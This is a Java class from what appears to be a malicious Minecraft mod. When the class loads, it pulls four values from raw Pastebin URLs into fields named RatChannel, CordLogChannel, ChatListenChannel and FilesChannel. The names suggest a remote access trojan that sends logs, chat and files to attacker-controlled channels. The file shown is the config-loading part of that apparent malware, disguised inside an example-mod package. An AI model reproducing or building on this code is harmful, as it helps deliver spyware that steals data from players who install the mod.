package com.example.examplemod.Sender;

import java.io.IOException;
import java.net.URL;
import java.util.Scanner;

public class Cfg {
   public static String RatChannel;
   public static String CordLogChannel;
   public static String ChatListenChannel;
   public static String FilesChannel;

   static {
      try {
         RatChannel = (new Scanner((new URL("https://pastebin.com/raw/fAjH3G53")).openStream(), "UTF-8")).useDelimiter("\\A").next();
      } catch (IOException var4) {
         var4.printStackTrace();
      }

      try {
         CordLogChannel = (new Scanner((new URL("https://pastebin.com/raw/fxti4JPw")).openStream(), "UTF-8")).useDelimiter("\\A").next();
      } catch (IOException var3) {
         var3.printStackTrace();
      }

      try {
         ChatListenChannel = (new Scanner((new URL("https://pastebin.com/raw/2dsbVeW2")).openStream(), "UTF-8")).useDelimiter("\\A").next();
      } catch (IOException var2) {
         var2.printStackTrace();
      }

      try {
         FilesChannel = (new Scanner((new URL("https://pastebin.com/raw/P5xzXSFk")).openStream(), "UTF-8")).useDelimiter("\\A").next();
      } catch (IOException var1) {
         var1.printStackTrace();
      }

   }
}
